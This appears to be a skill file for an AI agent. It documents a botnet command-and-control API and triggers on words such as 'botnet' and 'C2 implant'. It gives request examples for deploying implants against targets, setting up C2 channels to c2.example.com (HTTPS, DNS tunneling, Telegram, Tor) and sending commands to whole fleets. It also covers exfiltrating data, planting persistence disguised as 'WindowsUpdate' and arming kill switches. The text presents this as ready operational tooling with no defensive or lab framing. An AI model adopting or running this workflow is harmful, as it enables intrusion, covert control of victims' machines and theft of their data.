---
name: quantum-c2-botnet-manager
description: >
  Quantum C2 botnet manager skill. Use when the user asks about botnets, C2 implants, or fleet management. Triggers on: "botnet", "C2 implant", "fleet management", "implant deployment", "command orchestration", "kill switch", "implant management".
---

# Quantum C2 Botnet Manager

Deploy and manage C2 implants and botnet fleets.

## Implant Management

### Implant Types
| Type | Description | Platform | Stealth |
|------|-------------|----------|---------|
| `beacon` | Standard callback implant | All | Medium |
| `stager` | Lightweight dropper | Windows, Linux | Low |
| `agent` | Full-featured implant | All | Medium |
| `micro` | Minimal footprint implant | Embedded | High |
| `service` | Service-based implant | Windows, Linux | Medium |

### Deploy Implant
```bash
POST /api/botnet/implants/deploy
{
  "target_id": "target-001",
  "type": "beacon",
  "options": {
    "c2_channel": "https",
    "c2_server": "c2.example.com",
    "beacon_interval_seconds": 30,
    "jitter": 0.25,
    "encryption": "aes256",
    "persistence": true
  }
}
```

### Implant Status
```bash
GET /api/botnet/implants
GET /api/botnet/implants/{implant_id}
```

**Response:**
```json
{
  "implant_id": "implant-abc123",
  "type": "beacon",
  "target_id": "target-001",
  "status": "active",
  "connected_at": "2024-01-15T10:00:00Z",
  "last_checkin": "2024-01-15T10:30:00Z",
  "platform": "windows",
  "version": "2.5.0",
  "metadata": {
    "hostname": "WORKSTATION-01",
    "username": "target",
    "ip": "192.168.1.100",
    "os": "Windows 10 Pro"
  },
  "stats": {
    "commands_executed": 45,
    "bytes_exfiltrated": 1048576,
    "uptime_hours": 72
  }
}
```

## C2 Channel Management

### C2 Channel Types
| Type | Protocol | Stealth | Speed |
|------|----------|---------|-------|
| `https` | HTTPS | Medium | High |
| `http` | HTTP | Low | High |
| `dns` | DNS tunneling | High | Low |
| `icmp` | ICMP tunneling | High | Low |
| `telegram` | Telegram API | Medium | Medium |
| `slack` | Slack API | Medium | Medium |
| `tor` | Tor hidden service | Very High | Low |
| `webrtc` | WebRTC | Medium | High |

### Configure C2 Channel
```bash
POST /api/botnet/c2-channels/config
{
  "primary": {
    "type": "https",
    "server": "c2.example.com",
    "port": 443,
    "path": "/api/beacon",
    "headers": {"X-Auth": "token123"},
    "tls": true
  },
  "fallback": [
    {"type": "dns", "server": "c2.example.com"},
    {"type": "telegram", "bot_token": "123456:ABC", "chat_id": "-100123"}
  ]
}
```

### C2 Channel Status
```bash
GET /api/botnet/c2-channels/status
```

**Response:**
```json
{
  "primary": {
    "type": "https",
    "status": "connected",
    "latency_ms": 45,
    "last_checkin": "2024-01-15T10:30:00Z"
  },
  "fallback": [
    {"type": "dns", "status": "available"},
    {"type": "telegram", "status": "available"}
  ]
}
```

## Fleet Monitoring

### Fleet Overview
```bash
GET /api/botnet/fleet/overview
```

**Response:**
```json
{
  "total_implants": 150,
  "active_implants": 142,
  "inactive_implants": 8,
  "by_type": {
    "beacon": 80,
    "agent": 50,
    "micro": 20
  },
  "by_platform": {
    "windows": 90,
    "linux": 40,
    "macos": 15,
    "embedded": 5
  },
  "by_status": {
    "healthy": 130,
    "degraded": 12,
    "offline": 8
  },
  "exfiltration_24h_mb": 45.2
}
```

### Fleet Details
```bash
GET /api/botnet/fleet/implants
GET /api/botnet/fleet/implants?status=active
GET /api/botnet/fleet/implants?platform=windows
GET /api/botnet/fleet/implants?limit=50&offset=0
```

### Implant Groups
```bash
GET /api/botnet/fleet/groups
POST /api/botnet/fleet/groups
{
  "name": "Target Group Alpha",
  "implant_ids": ["implant-001", "implant-002", "implant-003"]
}
```

## Command Orchestration

### Send Command to Single Implant
```bash
POST /api/botnet/implants/{implant_id}/command
{
  "command": "whoami",
  "timeout_seconds": 30
}
```

### Send Command to Group
```bash
POST /api/botnet/fleet/groups/{group_id}/command
{
  "command": "systeminfo",
  "timeout_seconds": 60
}
```

### Send Command to All Implants
```bash
POST /api/botnet/fleet/all/command
{
  "command": "checkin",
  "timeout_seconds": 30
}
```

### Command Status
```bash
GET /api/botnet/commands/{command_id}
GET /api/botnet/commands/{command_id}/results
```

**Response:**
```json
{
  "command_id": "cmd-abc123",
  "status": "completed",
  "created_at": "2024-01-15T10:30:00Z",
  "completed_at": "2024-01-15T10:30:05Z",
  "results": {
    "total_implants": 50,
    "successful": 48,
    "failed": 2,
    "outputs": [
      {"implant_id": "implant-001", "output": "nt authority\\system", "status": "success"},
      {"implant_id": "implant-002", "output": "target\\user", "status": "success"}
    ]
  }
}
```

## Data Exfiltration Management

### Exfiltration Methods
```bash
POST /api/botnet/exfiltration/deploy
{
  "target_implants": ["implant-001", "implant-002"],
  "source": "/path/to/data",
  "method": "https",
  "encryption": "aes256",
  "chunk_size_kb": 64
}
```

### Exfiltration Status
```bash
GET /api/botnet/exfiltration/status/{exfil_id}
```

### Exfiltration History
```bash
GET /api/botnet/exfiltration/history
GET /api/botnet/exfiltration/history?hours=24
```

## Persistence Mechanisms

### Persistence Types
| Method | Platform | Persistence |
|--------|----------|-------------|
| `registry_run` | Windows | High |
| `scheduled_task` | Windows | High |
| `service` | Windows | Very High |
| `launchd` | macOS | High |
| `cron` | Linux | Medium |
| `systemd` | Linux | High |
| `bootkit` | All | Very High |

### Deploy Persistence
```bash
POST /api/botnet/persistence/deploy
{
  "implant_id": "implant-abc123",
  "methods": [
    {"type": "registry_run", "key": "HKCU\\Run", "value": "WindowsUpdate"},
    {"type": "scheduled_task", "name": "WindowsUpdate", "trigger": "logon"}
  ]
}
```

### Persistence Status
```bash
GET /api/botnet/persistence/status/{implant_id}
```

## Kill Switch Management

### Configure Kill Switch
```bash
POST /api/botnet/kill-switch/config
{
  "enabled": true,
  "trigger_conditions": [
    {"type": "time_based", "condition": "after_date", "date": "2024-12-31"},
    {"type": "keyword", "condition": "url_contains", "keyword": "KILL_SWITCH"},
    {"type": "manual", "require_approval": true}
  ],
  "action": "destroy_all"
}
```

### Trigger Kill Switch
```bash
POST /api/botnet/kill-switch/trigger
{
  "reason": "operation_complete",
  "approval": "approved_by_commander"
}
```

### Kill Switch Status
```bash
GET /api/botnet/kill-switch/status
```

**Response:**
```json
{
  "enabled": true,
  "status": "armed",
  "triggered": false,
  "last_triggered": null,
  "implants_destroyed": 0,
  "implants_total": 150
}
```

## Implant Lifecycle

### Lifecycle States
```
deployed -> registered -> active -> (idle|busy) -> (dead|removed)
                |
                -> inactive (check-in timeout)
```

### Implant Lifecycle API
```bash
# Register new implant
POST /api/botnet/implants/register
{"beacon_id": "beacon-abc123", "metadata": {...}}

# Check implant health
POST /api/botnet/implants/{id}/health

# Gracefully shutdown implant
POST /api/botnet/implants/{id}/graceful-shutdown

# Force remove implant
DELETE /api/botnet/implants/{id}
```

## API Reference

### Implants
```
POST   /api/botnet/implants/deploy
GET    /api/botnet/implants
GET    /api/botnet/implants/{id}
POST   /api/botnet/implants/{id}/command
POST   /api/botnet/implants/{id}/health
POST   /api/botnet/implants/{id}/graceful-shutdown
DELETE /api/botnet/implants/{id}
```

### C2 Channels
```
POST   /api/botnet/c2-channels/config
GET    /api/botnet/c2-channels/status
```

### Fleet
```
GET    /api/botnet/fleet/overview
GET    /api/botnet/fleet/implants
GET    /api/botnet/fleet/groups
POST   /api/botnet/fleet/groups
POST   /api/botnet/fleet/groups/{id}/command
POST   /api/botnet/fleet/all/command
```

### Exfiltration
```
POST   /api/botnet/exfiltration/deploy
GET    /api/botnet/exfiltration/status/{id}
GET    /api/botnet/exfiltration/history
```

### Persistence
```
POST   /api/botnet/persistence/deploy
GET    /api/botnet/persistence/status/{implant_id}
```

### Kill Switch
```
POST   /api/botnet/kill-switch/config
POST   /api/botnet/kill-switch/trigger
GET    /api/botnet/kill-switch/status
```

## Workflows

### Deploy and Manage Fleet
```bash
# 1. Configure C2 channels
curl -X POST http://localhost:8000/api/botnet/c2-channels/config \
  -H "Content-Type: application/json" \
  -d '{"primary": {"type": "https", "server": "c2.example.com"}, "fallback": [{"type": "dns"}]}'

# 2. Deploy implants
curl -X POST http://localhost:8000/api/botnet/implants/deploy \
  -H "Content-Type: application/json" \
  -d '{"target_id": "target-001", "type": "beacon"}'

# 3. Check fleet status
curl http://localhost:8000/api/botnet/fleet/overview

# 4. Send command to group
curl -X POST http://localhost:8000/api/botnet/fleet/groups/group-001/command \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'
```

### Configure Kill Switch
```bash
# 1. Configure kill switch
curl -X POST http://localhost:8000/api/botnet/kill-switch/config \
  -H "Content-Type: application/json" \
  -d '{"enabled": true, "trigger_conditions": [{"type": "time_based", "date": "2024-12-31"}]}'

# 2. Check status
curl http://localhost:8000/api/botnet/kill-switch/status
```

## Best Practices

1. **Multiple C2 channels** — Ensure redundancy
2. **Rotate implants** — Replace compromised implants
3. **Use kill switch** — Plan for emergency cleanup
4. **Monitor health** — Track implant status
5. **Minimize persistence** — Only what is needed
6. **Encrypt everything** — Secure all data
7. **Document operations** — Keep clear records
8. **Test cleanup** — Verify kill switch works

## Troubleshooting

### Implant Not Connecting
```bash
# Check implant status
curl http://localhost:8000/api/botnet/implants/implant-001

# Check C2 channel status
curl http://localhost:8000/api/botnet/c2-channels/status

# Restart implant
curl -X POST http://localhost:8000/api/botnet/implants/implant-001/graceful-shutdown
```

### Command Not Returning
```bash
# Check command status
curl http://localhost:8000/api/botnet/commands/cmd-001

# Check implant health
curl -X POST http://localhost:8000/api/botnet/implants/implant-001/health
```

### Fleet Declining
```bash
# Get fleet overview
curl http://localhost:8000/api/botnet/fleet/overview

# Check implant health distribution
curl http://localhost:8000/api/botnet/implants?status=inactive
```
